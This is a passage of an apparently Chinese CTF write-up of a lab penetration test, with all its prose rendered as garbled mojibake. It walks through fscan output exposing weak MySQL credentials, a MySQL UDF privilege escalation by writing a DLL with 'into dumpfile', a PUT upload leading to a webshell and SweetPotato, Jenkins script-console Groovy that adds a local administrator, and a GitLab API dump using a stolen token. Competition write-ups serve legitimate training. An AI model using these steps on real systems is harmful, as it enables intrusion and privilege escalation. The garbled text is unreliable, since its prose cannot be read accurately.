å‘æˆ‘ï¼Œæˆ‘ tmsolonmonster åå‡ è½®æ‰ fix å‡ºæ¥ï¼Œä¸ç„¶ä¼°è®¡å‰ 10 è§£äº†ï¼Œå°‘äº†å·¨å¤šè½®åˆ†ï¼Œæœ€å awdp æ‰“åˆ°äº† 20 åï¼Œè¯´å®è¯æœ‰ç‚¹å±é™©ï¼Œç¬¬äºŒå¤©æ¸—é€è¿˜å¾—åŠªåŠ›æ‰è¡Œã€‚</p><p>â˜ğŸ¤“</p><h2 id="æ¸—é€"><span id="æ¸—é€"> æ¸—é€</span></h2><h3 id="erp"><span id="erp"> ERP</span></h3><p>heapdump è§£æ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">algMode = GCM, key = h6/C85NzZrpu4rt5euOt5A==, algName = AES</span><br></pre></td></tr></table></figure><p>æ‰“ shiro</p><p>å·¥å…·æ¢­äº†â˜ğŸ¤“</p><p>æ˜¥ç§‹ç»™çš„ vpsï¼ŒnmdğŸ˜¡aliyun é˜²ç«å¢™ï¼ŒçœŸæ˜¯æœäº†ï¼Œåè¿è¿ä¸ä¸Šå»ï¼Œå¥½åœ¨ erp ç»™çš„æ˜¯ rootï¼Œç›´æ¥å†™å…¬é’¥ï¼Œç”¨ä½œè·³æ¿æœºã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">./fscan_386 -h 192.168.8.146/24</span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.2</span><br><span class="line">start infoscan</span><br><span class="line">(icmp) Target 192.168.8.146   is alive</span><br><span class="line">(icmp) Target 192.168.8.9     is alive</span><br><span class="line">(icmp) Target 192.168.8.16    is alive</span><br><span class="line">(icmp) Target 192.168.8.12    is alive</span><br><span class="line">(icmp) Target 192.168.8.26    is alive</span><br><span class="line">(icmp) Target 192.168.8.38    is alive</span><br><span class="line">(icmp) Target 192.168.8.42    is alive</span><br><span class="line">(icmp) Target 192.168.8.253   is alive</span><br><span class="line">[*] Icmp alive hosts len is: 8</span><br><span class="line">192.168.8.146:22 open</span><br><span class="line">192.168.8.12:88 open</span><br><span class="line">192.168.8.9:1433 open</span><br><span class="line">192.168.8.38:445 open</span><br><span class="line">192.168.8.26:445 open</span><br><span class="line">192.168.8.16:445 open</span><br><span class="line">192.168.8.9:445 open</span><br><span class="line">192.168.8.38:139 open</span><br><span class="line">192.168.8.26:139 open</span><br><span class="line">192.168.8.12:139 open</span><br><span class="line">192.168.8.16:139 open</span><br><span class="line">192.168.8.9:139 open</span><br><span class="line">192.168.8.38:135 open</span><br><span class="line">192.168.8.26:135 open</span><br><span class="line">192.168.8.16:135 open</span><br><span class="line">192.168.8.12:135 open</span><br><span class="line">192.168.8.9:135 open</span><br><span class="line">192.168.8.42:80 open</span><br><span class="line">192.168.8.9:80 open</span><br><span class="line">192.168.8.42:22 open</span><br><span class="line">192.168.8.26:8080 open</span><br><span class="line">192.168.8.16:8080 open</span><br><span class="line">192.168.8.12:445 open</span><br><span class="line">192.168.8.146:8080 open</span><br><span class="line">192.168.8.9:8000 open</span><br><span class="line">192.168.8.38:3306 open</span><br><span class="line">192.168.8.42:8060 open</span><br><span class="line">192.168.8.9:8172 open</span><br><span class="line">192.168.8.42:9094 open</span><br><span class="line">[*] alive ports len is: 29</span><br><span class="line">start vulscan</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]192.168.8.9</span><br><span class="line">   [-&gt;]WIN-IISSERER</span><br><span class="line">   [-&gt;]192.168.8.9</span><br><span class="line">[*] NetBios: 192.168.8.9     WORKGROUP\WIN-IISSERER         </span><br><span class="line">[*] NetBios: 192.168.8.12    [+]DC VERTEXSOFT\RODC          </span><br><span class="line">[*] NetBios: 192.168.8.16    WORKGROUP\WIN-SERVER03         </span><br><span class="line">[*] NetBios: 192.168.8.26    WORKGROUP\WIN-PC3788           </span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]192.168.8.12</span><br><span class="line">   [-&gt;]RODC</span><br><span class="line">   [-&gt;]192.168.8.12</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]192.168.8.16</span><br><span class="line">   [-&gt;]WIN-SERVER03</span><br><span class="line">   [-&gt;]192.168.8.16</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]192.168.8.38</span><br><span class="line">   [-&gt;]WIN-OPS88</span><br><span class="line">   [-&gt;]192.168.8.38</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]192.168.8.26</span><br><span class="line">   [-&gt;]WIN-PC3788</span><br><span class="line">   [-&gt;]192.168.8.26</span><br><span class="line">[*] NetBios: 192.168.8.38    WORKGROUP\WIN-OPS88            </span><br><span class="line">[*] WebTitle: http://192.168.8.9        code:200 len:43679  title:VertexSoft</span><br><span class="line">[*] WebTitle: http://192.168.8.146:8080 code:302 len:0      title:None è·³è½¬url: http://192.168.8.146:8080/login;jsessionid=90755EEEA0F7C042B6BED5B745C68D14</span><br><span class="line">[*] WebTitle: http://192.168.8.146:8080/login;jsessionid=90755EEEA0F7C042B6BED5B745C68D14 code:200 len:1383   title:Master ERP login Form</span><br><span class="line">[*] WebTitle: http://192.168.8.42       code:302 len:99     title:None è·³è½¬url: http://192.168.8.42/users/sign_in</span><br><span class="line">[*] WebTitle: http://192.168.8.42:8060  code:404 len:555    title:404 Not Found</span><br><span class="line">[*] WebTitle: http://192.168.8.26:8080  code:200 len:147    title:ç¬¬ä¸€ä¸ª JSP ç¨‹åº</span><br><span class="line">[*] WebTitle: http://192.168.8.16:8080  code:403 len:594    title:None</span><br><span class="line">[*] WebTitle: https://192.168.8.9:8172  code:404 len:0      title:None</span><br><span class="line">[*] WebTitle: http://192.168.8.9:8000   code:200 len:4018   title:Modbus Monitor - VertexSoft Internal Attendance System</span><br><span class="line">[*] WebTitle: http://192.168.8.42/users/sign_in code:200 len:11166  title:ç™»å½• Â· GitLab</span><br><span class="line">[+] http://192.168.8.146:8080 poc-yaml-spring-actuator-heapdump-file </span><br><span class="line">[+] http://192.168.8.146:8080 poc-yaml-springboot-env-unauth spring2</span><br><span class="line">[+] mysql:192.168.8.38:3306:root 123456</span><br></pre></td></tr></table></figure><h3 id="win-ops88"><span id="win-ops88"> WIN-OPS88</span></h3><p>fscan æ‰«å‡ºæ¥ mysql å¼±å¯†ç ï¼Œdatagrip è¿ä¸Šå» udf ææƒï¼Œä¸è¿‡æ²¡æƒ³åˆ°æ˜¯ windows çš„ udfï¼Œæœ‰ç‚¹ç½•è§â˜ğŸ¤“</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 0xxxxx into dumpfile  &quot;C:\\Program Files\\MySQL\\MySQL Server 8.0\\lib\\plugin\\exp.dll&quot;</span><br></pre></td></tr></table></figure><p>è‡ªå·±æœ¬åœ°æ‰¾ä¸€ä¸‹ udf ç”¨çš„ dll æ–‡ä»¶</p><h3 id="win-pc3788"><span id="win-pc3788"> WIN-PC3788</span></h3><p>æœ¬æ¥æƒ³æ‰“ RODC çš„ï¼Œä»¥ä¸ºè¿™ä¸ªæ˜¯ï¼Œç„¶åæ‰“æ­ªäº†ï¼Œæ‹¿äº†ä¸ªä¸€è¡€ï¼Œæœ€åä¹Ÿæ˜¯ 4 è§£ï¼Œä¸æ˜¯å“¥ä»¬æ€ä¹ˆæ‰ 500 åˆ†å•Šæ¼</p><p>æ‰«å‡ºæ¥ backup/upload ç›®å½•ï¼Œæ˜¯ä¸ª put æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œä½†æ˜¯ upload ç›®å½•ä¸è§£æ jspï¼Œå°è¯•ç»•è¿‡</p><p><img src="/2024/07/25/CISCN%E4%B9%8B%E6%97%85/image-20240725172527784.png" alt="image-20240725172527784"></p><p>ç„¶åä¸Šå“¥æ–¯æ‹‰è¿ä¸Šå»ï¼Œç„¶åä¸Šä¼  SweetPotato, ææƒæˆåŠŸã€‚</p><h3 id="jinkens"><span id="jinkens"> Jinkens</span></h3><p>jenkins admin:admin123 ç™»å½•</p><p>script ç›´æ¥æ‹¿åˆ°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">println &quot;net user test qwer1234! /add&quot;.execute().text</span><br><span class="line">println &quot;net localgroup administrators test /add&quot;.execute().text</span><br></pre></td></tr></table></figure><p>è¿œç¨‹æ¡Œé¢ä¸Šå»</p><h3 id="gitlab"><span id="gitlab"> Gitlab</span></h3><p>äº‘å¢ƒåŸé¢˜ï¼Œæ‰¾.jenkinsï¼Œæ‹¿åˆ°åŠ å¯†çš„ tokenï¼Œæ”¾å…¥ script è§£å¯†ï¼Œç„¶åè¾“å…¥ä¸‹é¢å°±è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains -f /home/siroha/socks5 curl --header &quot;PRIVATE-TOKEN: glpat-bGEgHAJDvwaPP78rsLeS&quot; &quot;http://192.168.8.42/api/v4/projects&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;id&quot;: 5,</span><br><span class="line">        &quot;description&quot;: null,</span><br><span class="line">        &quot;name&quot;: &quot;VertexSoftBackup&quot;,</span><br><span class="line">        &quot;name_with_namespace&quot;: &quot;VertexSoft / VertexSoftBackup&quot;,</span><br><span class="line">        &quot;path&quot;: &quot;vertexsoftbackup&quot;,</span><br><span class="line">        &quot;path_with_namespace&quot;: &quot;vertexsoft/vertexsoftbackup&quot;,</span><br><span class="line">        &quot;created_at&quot;: &quot;2024-07-11T17:03:43.603Z&quot;,</span><br><span class="line">        &quot;default_branch&quot;: &quot;main&quot;,</span><br><span class="line">        &quot;tag_list&quot;: [],</span><br><span class="line">        &quot;topics&quot;: [],</span><br><span class="line">        &quot;ssh_url_to_repo&quot;: &quot;git@192.168.8.42:vertexsoft/vertexsoftbackup.git&quot;,</span><br><span class="line">        &quot;http_url_to_repo&quot;: &quot;http://192.168.8.42/vertexsoft/vertexsoftbackup.git&quot;,</span><br><span class="line">        &quot;web_url&quot;: &quot;http://192.168.8.42/vertexsoft/vertexsoftbackup&quot;,</span><br><span class="line">        &quot;readme_url&quot;: &quot;http://192.168.8.42/vertexsoft/vertexsoftbackup/-/blob/main/README.md&quot;,</span><br><span class="line">        &quot;forks_count&quot;: 0,</span><br><span class="line">        &quot;avatar_url&quot;: null,</span><br><span class="line">        &quot;star_count&quot;: 0,</span><br><span class="line">        &quot;last_activity_at&quot;: &quot;2024-07-17T05:42:29.243Z&quot;,</span><br><span class="line">        &quot;namespace&quot;: &#123;</span><br><span class="line">            &quot;id&quot;: 2,</span><br><span class="line">            &quot;name&quot;: &quot;VertexSoft&quot;,</span><br><span class="line">            &quot;path&quot;: &quot;vertexsoft&quot;,</span><br><span class="line">            &quot;kind&quot;: &quot;group&quot;,</span><br><span class="line">            &quot;full_path&quot;: &quot;vertexsoft&quot;,</span><br><span class="line">            &quot;parent_id&quot;: null,</span><br><span class="line">            &quot;avatar_url&quot;: null,</span><br><span class="line">            &quot;web_url&quot;: &quot;http://192.168.8.42/groups/vertexsoft&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;repository_storage&quot;: &quot;default&quot;,</span><br><span class="line">        &quot;_links&quot;: &#123;</span><br><span class="line">            &quot;self&quot;: &quot;http://192.168.8.42/api/v4/projects/5&quot;,</span><br><span class="line">            &quot;issues&quot;: &quot;http://192.168.8.42/api/v4/projects/5/issues&quot;,</span><br><span class="line">            &quot;merge_requests&quot;: &quot;http://192.168.8.42/api/v4/projects/5/merge_requests&quot;,</span><br><span class="line">            &quot;repo_branches&quot;: &quot;http://192.168.8.42/api/v4/projects/5/repository/branches&quot;,</span><br><span class="line">            &quot;labels&quot;: &quot;http://192.168.8.42/api/v4/projects/5/labels&quot;,</span><br><span class="line">            &quot;events&quot;: &quot;http://192.168.8.42/api/v4/projects/5/events&quot;,</span><br><span class="line">            &quot;members&quot;: &quot;http://192.168.8.42/api/v4/projects/5/members&quot;,</span><br><span class="line">            &quot;cluster_agents&quot;: &quot;http://192.168.8.42/api/v4/projects/5/cluster_agents&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;packages_enabled&quot;: true,</span><br><span class="line">        